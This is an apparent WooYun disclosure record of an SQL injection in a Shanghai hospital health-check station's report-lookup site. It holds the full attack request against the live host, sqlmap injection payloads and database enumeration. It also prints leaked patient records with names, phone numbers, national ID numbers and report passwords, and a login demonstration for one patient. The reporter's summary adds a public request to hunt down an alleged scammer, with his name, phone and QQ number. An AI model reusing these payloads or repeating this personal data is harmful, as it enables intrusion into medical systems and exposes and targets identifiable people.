{"id": 48451, "wybug_id": "wooyun-2014-082940", "wybug_title": "上海市某医院体检站漏洞泄露大量体检报告(包括个人资料、身体状况等)系列二", "wybug_corp": "上海市某医院", "wybug_author": "小饼仔", "wybug_date": "2014-11-12 11:36", "wybug_open_date": "2014-12-27 11:38", "wybug_type": "SQL注射漏洞", "wybug_level": "高", "wybug_rank_0": "20", "wybug_status": "已交由第三方合作机构(cncert国家互联网应急中心)处理", "wybug_from": "http://www.wooyun.org", "wybug_tags": ["注入", "信息泄露"], "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2014-11-12：\t细节已通知厂商并且等待厂商处理中\t\t\t\t\t\t\t\t\t2014-11-14：\t厂商已经确认，细节仅向厂商公开\t\t\t\t\t\t\t\t\t2014-11-24：\t细节向核心白帽子及相关领域专家公开\t\t\t\t\t\t\t\t\t2014-12-04：\t细节向普通白帽子公开\t\t\t\t\t\t\t\t\t2014-12-14：\t细节向实习白帽子公开\t\t\t\t\t\t\t\t\t2014-12-27：\t细节向公众公开  简要描述： 个人信息泄露 之 体检中心系列 第二发数据量：15W+用户信息，几百万科室体检结果泄露用户信息有姓名、性别、身份证号、联系电话、社保卡号、邮箱、卡号、查询密码等并可查询下载、体检报告PS. 帮一个妹子朋友，求人肉个骗子 骗子信息 电话号码：13918792971(上海) QQ: 94478959 王小新，此人租房不退押金，人跑了，打电话不接，妹子很伤心，在此感谢各位帮忙~ 详细说明：  第二发，求上首页~信息：上海市普陀区中心医院健康体检站 :报告查询链接：http://www.sptdch.cn:8080/happy/reportsearch.asp\n\n注入点:查询处POST注入,验证码不会过期(审核验证时请重新拦截请求，防止验证码因时间过长而失效)\nPOST /happy/chkuser.asp HTTP/1.1Host: www.sptdch.cn:8080Proxy-Connection: keep-aliveContent-Length: 111Cache-Control: max-age=0Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8Origin: http://www.sptdch.cn:8080User-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/38.0.2125.104 Safari/537.36Content-Type: application/x-www-form-urlencodedDNT: 1Referer: http://www.sptdch.cn:8080/happy/reportsearch.aspAccept-Encoding: gzip,deflateAccept-Language: zh-CN,zh;q=0.8,en-US;q=0.6,en;q=0.4Cookie: ASPSESSIONIDQAARBRAD=OJENGDGBANONCGDNGGLBFOALRA-Ver: 2.7.1RA-Sid: 65E7C870-20141014-044958-a23ba1-b78bccseltype=0&userid=aaaa&username=aaa&password=aaa&CheckCode=6192&log_s=%E6%9F%A5%E8%AF%A2&action=user&utype=login\n   漏洞证明：  SQLMAP：\nsqlmap identified the following injection points with a total of 0 HTTP(s) requests:---Place: POSTParameter: userid    Type: error-based    Title: Microsoft SQL Server/Sybase AND error-based - WHERE or HAVING clause    Payload: seltype=0&userid=aaaa' AND 4181=CONVERT(INT,(SELECT CHAR(113)+CHAR(121)+CHAR(121)+CHAR(113)+CHAR(113)+(SELECT (CASE WHEN (4181=4181) THEN CHAR(49) ELSE CHAR(48) END))+CHAR(113)+CHAR(113)+CHAR(99)+CHAR(112)+CHAR(113))) AND 'ClHU'='ClHU&username=aaa&password=aaa&CheckCode=6192&log_s=%E6%9F%A5%E8%AF%A2&action=user&utype=login    Type: stacked queries    Title: Microsoft SQL Server/Sybase stacked queries    Payload: seltype=0&userid=aaaa'; WAITFOR DELAY '0:0:5'--&username=aaa&password=aaa&CheckCode=6192&log_s=%E6%9F%A5%E8%AF%A2&action=user&utype=login    Type: AND/OR time-based blind    Title: Microsoft SQL Server/Sybase OR time-based blind (heavy query)    Payload: seltype=0&userid=-6916' OR 4210=(SELECT COUNT(*) FROM sysusers AS sys1,sysusers AS sys2,sysusers AS sys3,sysusers AS sys4,sysusers AS sys5,sysusers AS sys6,sysusers AS sys7) AND 'hRJv'='hRJv&username=aaa&password=aaa&CheckCode=6192&log_s=%E6%9F%A5%E8%AF%A2&action=user&utype=login---web server operating system: Windows 2003 or XPweb application technology: ASP.NET, Microsoft IIS 6.0, ASPback-end DBMS: Microsoft SQL Server 2008current database:    'web'current user is DBA:    Trueavailable databases [8]:[*] jzcis[*] master[*] model[*] msdb[*] ReportServer[*] ReportServerTempDB[*] tempdb[*] webDatabase: web+-------------------------+---------+| Table                   | Entries |+-------------------------+---------+| dbo.HYB                 | 3599570 || dbo.NKB                 | 977613  || dbo.WKB                 | 894409  || dbo.YKB                 | 584752  || dbo.EBHB                | 427197  || dbo.KQB                 | 376879  || dbo.XYB                 | 198053  || dbo.DXB                 | 168776  || dbo.FKB                 | 163860  || dbo.JCXX                | 127943  || dbo.USB                 | 119766  || dbo.XDB                 | 107253  || dbo.JLB                 | 104837  || dbo.BLB                 | 35242   || dbo.zk_WebYH            | 34252   || dbo.ELB                 | 30023   || dbo.FZ_JCSFXM           | 21101   || dbo.CTB                 | 10788   |省略...+-------------------------+---------+\n表名以B结尾的是不同科室的检查结果，加起来几百万表dbo.JCXX为体检用户信息，数据量127943，表结构如下，一百多个字段\nDatabase: webTable: JCXX[119 columns]+-----------------+----------+| Column          | Type     |+-----------------+----------+| BorthAddress    | varchar  || CARD            | varchar  || CKDate          | datetime || Class1_ID       | varchar  || Class1_R        | varchar  || Class2_ID       | varchar  || Class2_R        | varchar  || Class3_ID       | varchar  || Class3_R        | varchar  || Clinic_No       | varchar  || Contract_ID     | varchar  || Count_Flag      | varchar  || Count_Flag_Date | datetime || Count_Status    | varchar  || CSNY            | datetime || CYRQ            | datetime || DJCount         | int      || DJJE            | money    || DJModi          | varchar  || DJXM            | text     || DJYS            | varchar  || DWDM            | varchar  || DWFZDM          | varchar  || Email           | varchar  || ETDate          | datetime || GB              | varchar  || GH              | varchar  || GRDNH           | varchar  || GWDM            | varchar  || GZDM            | varchar  || GZKS            | text     || HF              | varchar  || HISGroupSFID    | varchar  || HisTFBJ         | varchar  || Hosptial_No     | varchar  || HSDate          | datetime || HSYS            | varchar  || HYXM            | text     || ID              | varchar  || IFSend          | varchar  || IFUpDown        | varchar  || InsureSeriesID  | varchar  || JCLB            | varchar  || JCRQ            | datetime || JCXM            | text     || JDRQ            | datetime || JE              | money    || JLYS            | varchar  || JZSFFS          | varchar  || LastModiDate    | datetime || LastModiYS      | varchar  || LXDH            | varchar  || Medical_No      | varchar  || MZ              | varchar  || NEWDJXM         | text     || Notices         | varchar  || NOWJE           | money    || NOWSSJE         | money    || OperaID         | varchar  || PACS_EIS        | varchar  || PACSXM          | text     || PassWord        | varchar  || PHOTO           | image    || PntBarCode      | int      || PntBarCodeTime  | datetime || PrintCount      | int      || PrintDate       | datetime || PrintYS         | varchar  || QUEUEID         | varchar  || RCardDate       | datetime || RCardFlag       | varchar  || ReCall          | varchar  || SendWhere       | varchar  || SFBJ            | varchar  || SFYS            | varchar  || SFZH            | varchar  || SpecialFlag     | varchar  || SQYS            | varchar  || SSJE            | money    || SSQX            | varchar  || SSSS            | varchar  || TJFB            | varchar  || TXDZ            | varchar  || updateState     | varchar  || updatesuccess   | varchar  || updatetime      | varchar  || UpDownTime      | datetime || VIPID           | varchar  || WCKS            | text     || WCXM            | text     || WHCD            | varchar  || XB              | varchar  || XFXM            | text     || XJJE            | money    || XJJE1           | money    || XJJE10          | money    || XJJE11          | money    || XJJE12          | money    || XJJE13          | money    || XJJE14          | money    || XJJE15          | money    || XJJE2           | money    || XJJE3           | money    || XJJE4           | money    || XJJE5           | money    || XJJE6           | money    || XJJE7           | money    || XJJE8           | money    || XJJE9           | money    || XM              | varchar  || YCXM            | text     || YSFBJ           | varchar  || ZHXMDM          | varchar  || ZJDCRQ          | datetime || ZJDCYS          | varchar  || ZJE             | money    || ZJHM            | varchar  || ZKL             | float    || ZY              | varchar  |+-----------------+----------+泄露信息有姓名、性别、身份证号、联系电话、社保卡号、邮箱、卡号等等部分字段举例：ID\tInsureSeriesID\tXM\tXB\tCSNY\tLXDH\tGZDM\tSFZH\tEmail\tPassWord\tBorthAddress\tCARD\tZJHM6212270069\t<blank>\t汤俊杰\t男\t12 16 1982 12:00AM\t13564318757\t<blank>\t310101198212162000\tNULL\t767793\tNULL\tNULL\tNULL6212270090\t<blank>\t李美龄\t女\t02 19 1986 12:00AM\t13761455739\t<blank>\t610402198602190000\tNULL\t170674\tNULL\tNULL\tNULL6212270117\t<blank>\t陈丽敏\t女\t10 10 1962 12:00AM\t13901995775\t<blank>\t310102196210104000\tNULL\t539905\tNULL\tNULL\tNULL6301040003\t<blank>\t施丽丹\t女\t06  7 1983 12:00AM\t13816434968\t<blank>\t320684198306071000\tNULL\t349404\tNULL\tNULL\tNULL6301040004\t<blank>\t张伊文\t女\t08 15 1988 12:00AM\t15601971041\t<blank>\t310107198808154000\tNULL\t972614\tNULL\tNULL\tNULL6301040005\t<blank>\t卢辉明\t男\t11  1 1976 12:00AM\t13818453805\t<blank>\t410711197611011000\tNULL\t157815\tNULL\tNULL\tNULL6301040006\t<blank>\t商思军\t男\t12 10 1968 12:00AM\t13564399121\t<blank>\t310107196812101000\tNULL\t727907\tNULL\tNULL\tNULL6301040007\t<blank>\t张丽娟\t女\t03 14 1991 12:00AM\t15216861664\t<blank>\t340321199103141000\tNULL\t941975\tNULL\tNULL\tNULL6301040008\t<blank>\t王如臣\t男\t10 17 1975 12:00AM\t15618880755\t<blank>\t41080320130104100000\tNULL\t447505\tNULL\tNULL\tNULL\n登陆页面出查询所需信息为体检号、姓名、查询密码对应字段ID、XM、PASSWORD这里举一个例子证明6212270069 汤俊杰 767793\n\n可查询、下载体检报告\n\n以一个人一份体检报告，至少有12W+，如果一人两份，则是24W+还有一个表zk_WebYH为web预约用户信息,记录数34252，可以登陆，里面有身份证号等信息，这里就不列了两个合起来就有15W+的用户   修复方案：  过滤   版权声明：转载请注明来源 小饼仔@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 危害等级：中 漏洞Rank：9  确认时间：2014-11-14 17:43 厂商回复：   最新状态： 暂无  ", "replys": "漏洞评价：\n评论\n     2014-12-27 11:40 |    \t\tCh丶0nly \t\t\t( 普通白帽子  |\t\t\t        Rank:205 漏洞数:50        | 专注网络30年。)\t\t \n  别人提及的都是 几百万起 太少拿不出手    \n  \n\n\n", "wybug_level_fromcorp": "中", "wybug_rank_fromcorp": 9, "Ranks": null}